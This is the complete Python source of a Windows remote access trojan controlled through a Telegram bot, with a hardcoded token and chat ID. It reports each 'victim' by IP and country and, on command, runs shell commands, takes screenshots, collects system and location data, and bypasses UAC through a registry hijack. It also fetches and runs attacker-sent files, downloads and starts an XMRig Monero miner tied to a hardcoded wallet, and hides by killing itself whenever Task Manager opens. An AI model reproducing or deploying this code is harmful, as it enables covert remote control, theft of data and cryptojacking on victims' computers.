import requests
import json
import sys
import os
import getpass
from psutil import virtual_memory
from platform import uname , processor , machine
import subprocess
import pyautogui
import tempfile
from _winreg import *
import ctypes
import itertools
import psutil
import threading
import re
class Loader():
	def __init__(self):
		self.Kill_Self()
		self.progrm = sys.argv[1]
		self.token = "1761596488:AAG_BdDHTLiX5n40BT5R969inOpRGkYV6fs"
		self.chat_id = "1742761281"
		data = json.loads(self.Request("http://ip-api.com/json/"))
		self.ip = data["query"]
		self.country = data["country"]
		self.privileges = "Administrator" if ctypes.windll.shell32.IsUserAnAdmin() == 1 else "User"
		thread = threading.Thread(target = self.Auto_Close)
		thread.start()
		self.SendNotification()
		while True:
			try:
				self.Main()
			except ConnectionError:
				pass
			except Exception as ex:
				self.SendMessage("%E2%9C%96%EF%B8%8F Error : \n %E2%9D%96 Message : " + str(ex))
	def Request(self,url):
		return requests.get(url).text.encode("utf-8")
	def Send_File(self,filename):
		url = "https://api.telegram.org/bot" + self.token + "/sendPhoto?caption=--" + getpass.getuser() + "--&chat_id=" + self.chat_id
		requests.get(url, files={'photo':open(filename,'rb')})
	def SendNotification(self):
		filename = "C:\\Users\\Public\\old.txt"
		if os.path.exists(filename):
			self.SendMessage("%F0%9F%98%88  Online Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + self.progrm + "\n %E2%9D%96 Privileges : " + self.privileges)
		else:
			file = open("C:\\Users\\Public\\old.txt","w")
			self.SendMessage("%F0%9F%98%88  New Victim : \n %E2%9D%96 IP Address : " + self.ip + "\n %E2%9D%96 Country : " + self.country + " \n %E2%9D%96 Program Name : " + self.progrm + "\n %E2%9D%96 Privileges : " + self.privileges)
	def SendMessage(self,message):
		self.Request("https://api.telegram.org/bot" + self.token + "/sendMessage?text=" + message + "\n--" + getpass.getuser() + "--&chat_id=" + self.chat_id)
	def Main(self):
		data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getUpdates'))
		old_date = data['result'][-1]['message']['date']
		while True:
			data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getUpdates'))
			message = data['result'][-1]['message']
			new_date = message['date']
			if(old_date != new_date):
				old_date = new_date
				if("text" in message.keys()):
					command = message['text'].split(" ")[0]
					if command == "/list":
						self.SendNotification()
					if command == "/geo" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						data = json.loads(self.Request('http://ip-api.com/json/'))
						message = "%F0%9F%8C%8E Geo Location : \n"
						message += "%E2%9D%96 IP : " + data['query'] + "\n";
						message += "%E2%9D%96 Country : " + data['country'] + "\n";
						message += "%E2%9D%96 City : " + data['city'] + "\n";
						message += "%E2%9D%96 Region Name : " + data['regionName'] + "\n";
						message += "%E2%9D%96 Country Code : " + data['countryCode'] + "\n";
						message += "%E2%9D%96 Time Zone : " + data['timezone'] + "\n";
						message += "%E2%9D%96 MAP : http://extreme-ip-lookup.com/" + data['query'];
						self.SendMessage(message)
					elif command == "/close" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						os.system("taskkill /IM python.exe /F")
					elif command == "/sys_info" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						message = "%F0%9F%96%A5 System Info : \n"
						message += "%E2%9D%96 Username : " + getpass.getuser() + "\n"
						message += "%E2%9D%96 OS Version : Windows " + uname()[2] + "\n"
						message += "%E2%9D%96 RAM : " + str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB" + "\n"
						message += "%E2%9D%96 Bit : " + machine() + "\n"
						message += "%E2%9D%96 Processor : " + processor()
						self.SendMessage(message)
					elif command == "/restart" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						filename = os.path.abspath(__file__).split("\\")
						filename.pop()
						filename = "\\".join(filename) + "\\Main.vbs"
						os.system("cmd.exe /c taskkill /F /IM PID " + str(os.getpid()) + " /F && " + filename)
					elif command == "/execute" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						spl = message['text'].split(" ")
						spl.remove(spl[0])
						spl.pop()
						cmd = " ".join(spl)
						runcmd = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
						output = runcmd.stdout.read() + runcmd.stderr.read()
						message = "%F0%9F%96%A5 Command [" + cmd + "] Output : \n"
						message += output
						self.SendMessage(message)
					elif command == "/screenshot" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						file = tempfile.TemporaryFile()
						filename = file.name + ".jpg"
						file.close()
						pyautogui.screenshot().save(filename)
						self.Send_File(filename)
					elif command == "/browsers" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						browsers = ""
						with OpenKey(HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as k:
							for i in range(1024):
								try:
									borwser = (EnumKey(k, i))
									if borwser.startswith("Firefox"):
										borwser = "Firefox"
									elif borwser == "IEXPLORE.EXE":
										borwser = "Internet Explorer"
								except:
									break
								browsers += "%E2%9D%96 " + borwser + "\n"
						browsers = browsers.replace("\n\n","\n")
						self.SendMessage("%F0%9F%8C%90 Browsers List : \n" + browsers)
					elif command == "/bypass_uac" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						REG_PATH = r'Software\Classes\ms-settings\shell\open\command'
						CreateKey(HKEY_CURRENT_USER, REG_PATH)
						registry_key = OpenKey(HKEY_CURRENT_USER, REG_PATH, 0, KEY_WRITE)
						SetValueEx(registry_key, "DelegateExecute", 0, REG_SZ, "")
						dirname = os.path.abspath(__file__).split("\\")
						dirname.pop()
						dirname = "wscript.exe \"" + "\\".join(dirname) + "\\Main.vbs\""
						SetValueEx(registry_key, None, 0, REG_SZ, dirname)
						os.system("ComputerDefaults.exe")
						DeleteValue(registry_key, "")
						DeleteValue(registry_key, "DelegateExecute")
						CloseKey(registry_key)
						exit();
					elif command == "/change_prog" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						if ctypes.windll.shell32.IsUserAnAdmin() == 1:
							spl = message['text'].split(" ")
							spl.remove(spl[0])
							spl.pop()
							prog = " ".join(spl)
							dirname = os.path.abspath(__file__).split("\\")
							dirname.pop()
							filename =  "\\".join(dirname) + "\\Main.vbs"
							file = open(filename,"r")
							read = file.read()
							file.close()
							read = read.replace(re.findall('" ""(.*?)""',read)[0],prog)
							os.system('attrib -h -s ' + filename)
							file = open(filename,"w")
							file.write(read)
							file.close()
							os.system('attrib +h +s ' + filename)
							self.progrm = prog
							self.SendMessage("%E2%9C%94%EF%B8%8F Program Name Changed")
						else:
							self.SendMessage("%E2%9C%96%EF%B8%8F Need Administrator Privileges")
					elif command == "/download_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						self.SendMessage("%E2%9C%94%EF%B8%8F Downloading Miner...")
						links = ["https://raw.githubusercontent.com/MohamadXo213/Down-X/main/xmrig.exe","https://raw.githubusercontent.com/MohamadXo213/Down-X/main/WinRing0x64.sys"]
						for link in links:
							req = requests.get(link)
							filename = tempfile.gettempdir() + "\\" + link.split("/")[-1]
							file = open(filename,"wb")
							file.write(req.content)
							file.close()
						self.SendMessage("%E2%9C%94%EF%B8%8F Miner Downloaded")
					elif command == "/start_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						if os.path.exists(tempfile.gettempdir() + "\\xmrig.exe"):
							sub = subprocess.Popen(["cmd.exe","/c","%temp%\\xmrig.exe","-o","pool.supportxmr.com:443","-u","458ZEGNtG6G52CUbSmfbU4f47PiZqGaTDjRzFwRazR1JCxFdZvWdv6wQeG6PGmsskiHCw3yQ5XoptPQZwFkGxwpMMngnN2V","-k","--tls","-p",getpass.getuser()],shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Started")
						else:
							self.SendMessage("%E2%9C%96%EF%B8%8F Miner Not Installed")
					elif command == "/stop_miner" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						if os.path.exists(tempfile.gettempdir() + "\\xmrig.exe"):
							os.system('taskkill /IM xmrig.exe /F')
							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Stoped")
						else:
							self.SendMessage("%E2%9C%96%EF%B8%8F Miner Not Installed")
					elif command == "/miner_status" and message['text'].split(" ")[-1] in [self.ip , getpass.getuser() , "All"]:
						found = False
						for proc in psutil.process_iter():
							try:
								if proc.name() == "xmrig.exe":
									found = True
									break
							except:
								pass
						if found == True:
							self.SendMessage("%E2%9C%94%EF%B8%8F Miner Working")
						else:
							self.SendMessage("%E2%9C%96%EF%B8%8F Miner Not Working")
				else:
					file_id = message['document']['file_id']
					caption = message['caption']
					if caption in [self.ip, getpass.getuser(), "All"]:
						data = json.loads(self.Request('https://api.telegram.org/bot' + self.token + '/getFile?file_id=' + file_id))
						link = data['result']['file_path']
						link = "https://api.telegram.org/file/bot" + self.token + "/" + link
						file = tempfile.TemporaryFile()
						filename = file.name + "." + link.split(".")[-1]
						file.close()
						req = requests.get(link)
						file = open(filename,"wb")
						file.write(req.content)
						file.close()
						subprocess.Popen(filename,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
						self.SendMessage("%E2%9C%94%EF%B8%8F File Downlaoded And Executed")
	def Auto_Close(self):
		while True:
			for proc in psutil.process_iter():
				try:
					if proc.name() == "Taskmgr.exe":
						os.system("taskkill /IM miner.exe /F")
						os.system("taskkill /IM python.exe /F")
				except:
					pass
	def Kill_Self(self):
		for proc in psutil.process_iter():
				try:
					if proc.pid != os.getpid() and proc.name() == "python.exe" and "C:\\Windows\\Python\\Main.py" in proc.cmdline():
						os.system("taskkill /PID " + str(os.getpid()) + " /F")
				except:
					pass

Loader()
